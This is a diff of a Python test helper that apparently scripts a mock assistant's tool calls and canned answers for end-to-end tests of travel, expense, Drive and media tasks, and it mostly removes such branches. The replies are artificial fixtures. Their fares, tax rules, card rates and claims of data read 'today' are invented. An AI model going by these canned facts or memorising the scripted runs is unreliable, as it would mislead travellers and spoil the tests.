-            return reply("", [tc_("make_pdf", {"markdown": "# Reimbursement request — Tokyo trip\n\n| Category | JPY |\n|---|---|\n| Meals | 18,000 |\n| Lodging | 78,000 |\n| **Total** | **96,000** |\n\nEvidence: receipt R-7781 (photo), Agoda receipt email, card statement rows.",
-                                               "output": "expenses/tokyo-claim.pdf"})])
-        if n == 7:
-            return reply("", [tc_("send_file", {"paths": ["expenses/tokyo-expenses.xlsx", "expenses/tokyo-claim.pdf"]})])
-        return reply("EXPENSE REPORT — Tokyo trip\n\n| Category | JPY |\n|---|---|\n| Meals (Sushi Hoshizora, receipt R-7781) | 18,000 |\n"
-                     "| Lodging (Agoda, Hotel Ginza Grand) | 78,000 |\n| **Total** | **96,000 JPY** |\n\nBoth lines match the card statement; "
-                     "no statement row is without a receipt. Files: expenses/tokyo-expenses.xlsx, expenses/tokyo-claim.pdf.")
-    if "PAYASIA" in goal:   # payments-connectivity-asia: rates from market data, no browser
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "payments-connectivity-asia"})])
-        if n == 1:
-            return reply("", [tc_("market_data", {"symbols": ["SGDJPY=X", "SGDCNY=X"]})])
-        rate = re.search(r"SGD/JPY[^0-9]*([0-9.]+)", last_tool)
-        return reply(f"Tokyo: cards work in most places but carry cash for small restaurants; get a Welcome Suica (28 days, no deposit) or Mobile Suica; "
-                     f"1 SGD = {rate.group(1) if rate else '?'} JPY (market data just now). Shanghai: set up Alipay or WeChat Pay with your foreign card before "
-                     f"you leave (the SMS code is the step that fails); Didi for taxis. Connectivity: an eSIM installed at home; roaming eSIMs route around the "
-                     f"blocked sites in mainland China. Decline dynamic currency conversion everywhere.")
-    if "GETAROUND" in goal:   # getting-around-asia: the operator's timetable page, read not clicked
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "getting-around-asia"})])
-        if n == 1:
-            return reply("", [tc_("browser_read", {"urls": [PAGES + "/timetable.html"]})])
-        fare = re.search(r"¥[\d,]+", last_tool)
-        dep = re.search(r"(\d\d:\d\d)", last_tool)
-        return reply(f"| Option | Dep | Arr Tokyo | Fare |\n|---|---|---|---|\n| Narita Express 7 | {dep.group(1) if dep else '?'} | 08:41 | {fare.group(0) if fare else '?'} |\n"
-                     f"| Keisei Skyliner (to Ueno) | 07:50 | 08:31 | ¥2,580 |\n\nWith two big suitcases take the Narita Express (reserved seats, luggage racks); "
-                     f"buy at the JR counter or machine on arrival. Timetable read from the operator's page today.")
-    if "TAXREFUND" in goal:   # tax-refund-shopping: the official rule page, a departure-day reminder
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "tax-refund-shopping"})])
-        if n == 1:
-            return reply("", [tc_("browser_read", {"urls": [PAGES + "/taxfree.html"]})])
-        if n == 2:
-            return reply("", [tc_("schedule_create", {"name": "Tax refund before check-in", "goal": "Remind me: tax-free terminal at the airport before checking in luggage, receipts and goods in hand",
-                                                       "kind": "cron", "spec": "0 7 * * *"})])
-        return reply("From 1 November 2026 you pay the full price in the shop and get the refund at departure: scan your passport at the tax-free "
-                     "terminal before checking in luggage; goods bought within 90 days qualify and every item on a receipt must be present. "
-                     "I set a departure-day reminder. (Rule page read today, 2026-10-25.)")
-    if "HOTELREQ" in goal:   # hotel-requests
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "hotel-requests"})])
-        if n == 1:
-            return reply("", [tc_("gmail_search", {"query": "(hotel OR booking OR reservation) Ginza newer_than:90d"})])
-        if n == 2:
-            return reply("", [tc_("gmail_get_message", {"message_id": _msg_id(last_tool)})])
-        if n == 3:
-            return reply("", [tc_("gmail_create_draft", {"to": "reservations@ginzagrand.example", "subject": "Early check-in request — confirmation 88812345",
-                                                          "body": "Dear Hotel Ginza Grand, I arrive on 20 Nov 2026 around 11:00 (confirmation 88812345, Lucas Lu). Could an early check-in be arranged, or luggage storage if the room is not ready? Thank you."})])
-        dl = re.search(r"[Ff]ree cancellation until ([^.;\n\"]+)", str(tools_done[2]["content"]) if len(tools_done) > 2 else "")
-        return reply(f"Booking 88812345 at Hotel Ginza Grand, 20–23 Nov 2026. Free cancellation until {dl.group(1).strip() if dl else 'not found in the mail'}. "
-                     f"I drafted the early check-in request to the hotel — send it from your drafts.")
-    if "WHICHCARD" in goal:   # credit-card-picker: profile cards + the catalog table, maths with calculate, no browser
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "credit-card-picker"})])
-        if n == 1:
-            return reply("", [tc_("vault_list", {})])
-        if n == 2:
-            return reply("", [tc_("load_skill", {"name": "credit-card-picker", "file": "cards/us.md"})])
-        if n == 3:
-            return reply("", [tc_("calculate", {"expression": "300 * 3 * 0.01, 300 * 0.02"})])
-        table = str(tools_done[2]["content"])
-        csr = re.search(r"\| Chase \| Sapphire Reserve[^\n]*", table)
-        rate = re.search(r"dining (\d+(?:\.\d+)?)x", csr.group(0)) if csr else None
-        ver = re.search(r"\| (\d{4}-\d\d-\d\d) \|", csr.group(0)) if csr else None
-        return reply(f"| Card | Rate | Value | Caveat |\n|---|---|---|---|\n| Chase Sapphire Reserve | dining {rate.group(1) if rate else '?'}x | USD 9.00 | points at 1¢ |\n"
-                     f"| Citi Double Cash | 2% cashback | USD 6.00 | — |\n\nUse the **Chase Sapphire Reserve** for the USD 300 dinner: "
-                     f"{rate.group(1) if rate else '?'}x on dining beats 2% cash back (9.00 vs 6.00, computed). Catalog verified {ver.group(1) if ver else '?'}; terms change.")
     if "CITYLIFT" in goal:   # city_guides_e2e.py: a booking skill loaded after a guide brings the browser back
         if n == 0:
             return reply("", [tc_("load_skill", {"name": "tokyo"})])
@@ -1663,65 +820,6 @@ def travel_skill(goal, sys, msgs, tools_done, n, last_tool, tnames):
         line = next((l.strip() for l in sheet.split("## Getting around", 1)[-1].splitlines() if l.strip().startswith("- ")), "")
         rate = re.search(re.escape(f"{sym[:3]}/{sym[3:6]}") + r"[^0-9]*([0-9][0-9,]*\.[0-9]+)", str(tools_done[1]["content"]))
         return reply(f"CITY ANSWER ({skill}). Getting around: {line[2:200]} | FX {sym}: {rate.group(1) if rate else '?'}")
-    if "DRIVECLEAN" in goal:   # drive_cleanup_e2e.py: quota + two searches in one turn, a list the user confirms, one trash batch
-        def ids_in(txt):
-            return [m for m in re.findall(r'"id": "([a-z]+-\d+)"', txt)]
-        if "yes" in goal.lower():   # the follow-up: the user picked numbers 1 and 2 → one drive_trash call with names
-            if n == 0:
-                return reply("", [tc_("drive_trash", {"file_ids": ["big-1", "big-2"], "names": ["backup-2022.zip", "old-render.mov"]})])
-            return reply("CLEANUP DONE: " + str(last_tool)[:300])
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "drive-cleanup"})])
-        if n == 1:
-            return reply("", [tc_("drive_storage", {}),
-                              tc_("drive_search", {"min_size_mb": 100, "order_by": "size", "max_results": 50}),
-                              tc_("drive_search", {"unused_days": 365, "min_size_mb": 20, "order_by": "size"})])
-        big = str(tools_done[2]["content"]); unused = str(tools_done[3]["content"])
-        names = re.findall(r'"name": "([^"]+)"', big)
-        return reply(f"CLEANUP LIST ({len(set(ids_in(big) + ids_in(unused)))} candidates: {', '.join(names)}). "
-                     "1. backup-2022.zip 2560 MB never opened; 2. old-render.mov 900 MB last opened 2023-02-01; 3. wedding-raw.mov 4096 MB opened 2026-10-01 (recent). "
-                     "Move all of these to the bin, or only some (numbers)?")
-    if "DRIVEVIDEO" in goal:   # drive_video_e2e.py: search → download both → concat (quiet) → caption → upload back
-        def out_path(txt):
-            m = re.search(r"(videos/[^\s（(]+\.mp4)", str(txt))
-            return m.group(1) if m else "videos/missing.mp4"
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "drive-video-edit"})])
-        if n == 1:
-            return reply("", [tc_("drive_search", {"kind": "video", "query": "kyoto", "order_by": "modified"})])
-        if n == 2:
-            ids = re.findall(r'"id": "(vid-\d+)"', str(last_tool))
-            return reply("", [tc_("drive_download", {"file_id": i}) for i in sorted(ids)])
-        if n == 4:
-            paths = re.findall(r"(drive/[^\s（(]+\.mp4)", "\n".join(str(x["content"]) for x in tools_done))
-            return reply("", [tc_("edit_video", {"op": "concat", "paths": sorted(set(paths)), "title": "kyoto", "send": False})])
-        if n == 5:
-            return reply("", [tc_("edit_video", {"op": "caption", "path": out_path(last_tool), "text": "Kyoto 2026", "position": "top",
-                                                 "start": 0, "end": 2, "title": "Kyoto highlights"})])
-        if n == 6:
-            return reply("", [tc_("drive_upload", {"path": out_path(last_tool), "folder_id": "fld-trip"})])
-        return reply("VIDEO EDIT DONE: " + str(last_tool)[:300])
-    if "DRIVEBOOK" in goal:   # drive_storybook_e2e.py: photos → download → one edit → the PDF → upload back
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "drive-photo-storybook"})])
-        if n == 1:
-            return reply("", [tc_("drive_search", {"kind": "image", "folder_id": "fld-bday", "order_by": "name"})])
-        if n == 2:
-            ids = re.findall(r'"id": "(img-\d+)"', str(last_tool))
-            return reply("", [tc_("drive_download", {"file_id": i}) for i in sorted(ids)])
-        if n == 5:
-            return reply("", [tc_("edit_image", {"path": "drive/mia-cake.jpg", "prompt": "soft watercolour children's book style", "title": "cake-watercolour"})])
-        if n == 6:
-            md = ("# Mia's Birthday\n\nA story book\n\n## The cake\n\n![cake](images/cake-watercolour.png)\n\nMia blew out five candles.\n\n"
-                  "## Balloons\n\n![balloons](drive/mia-balloons.jpg)\n\nBlue balloons floated to the ceiling.\n\n"
-                  "## Friends\n\n![friends](drive/mia-friends.jpg)\n\nEveryone sang.\n")
-            return reply("", [tc_("make_pdf", {"markdown": md, "output": "reports/Mia-birthday-storybook.pdf"})])
-        if n == 7:   # make_pdf does not send: show the book, then put it back in Drive
-            m = re.search(r"created locally: (\S+)", str(last_tool))
-            return reply("", [tc_("send_file", {"path": m.group(1) if m else "reports/Mia-birthday-storybook.pdf", "note": "Mia's birthday story book"})])
-        if n == 8:
-            return reply("", [tc_("drive_upload", {"path": "reports/Mia-birthday-storybook.pdf", "folder_id": "fld-bday", "name": "Mia birthday storybook.pdf"})])
-        return reply("STORYBOOK DONE: " + str(last_tool)[:300])
     if "VIDEOGEN" in goal:   # videogen_e2e.py: one short clip, shown in the chat
         if n == 0:
             prompt = "a violent storm at sea" if "storm" in goal else "a paper boat drifting across a calm pond at sunrise, gentle ripples"
@@ -1735,18 +833,6 @@ def travel_skill(goal, sys, msgs, tools_done, n, last_tool, tnames):
         if n == 1:
             return reply("", [tc_("edit_image", {"prompt": "add a blue scarf to the fox"})])
         return reply("IMAGES DONE: " + str(last_tool)[:200])
-    if "DIETARY" in goal:   # dining-dietary-translate
-        if n == 0:
-            return reply("", [tc_("load_skill", {"name": "dining-dietary-translate"})])
-        if n == 1:
-            return reply("", [tc_("file_look", {"path": _upload_path(sys, goal, "png"), "question": "Transcribe this menu and translate it to English; flag items containing peanuts."})])
-        if n == 2:
-            return reply("", [tc_("profile_suggest", {"field": "custom:allergies", "value": "peanut (severe)", "reason": "told me when asking for a dietary card"})])
-        flagged = re.search(r"([^\s;]+) Tantanmen[^;]*peanut", last_tool if n == 2 else str(tools_done[1]["content"]))
-        return reply("Your card (Japanese):\n私は重度のピーナッツアレルギーがあります。微量でも危険です。ソースや調理油にピーナッツが含まれていないか確認してください。"
-                     "ピーナッツ以外は何でも食べられます。ありがとうございます。\n(Watashi wa jūdo no pīnattsu arerugī ga arimasu…)\n\n"
-                     f"Menu check: avoid {flagged.group(1) if flagged else '担々麺'} (tantanmen — peanut sauce); 塩ラーメン and 餃子 do not list peanuts, but ask the kitchen. "
-                     "I noted the allergy in your profile for next time (confirm it on the Memory page).")
     return None
 
 
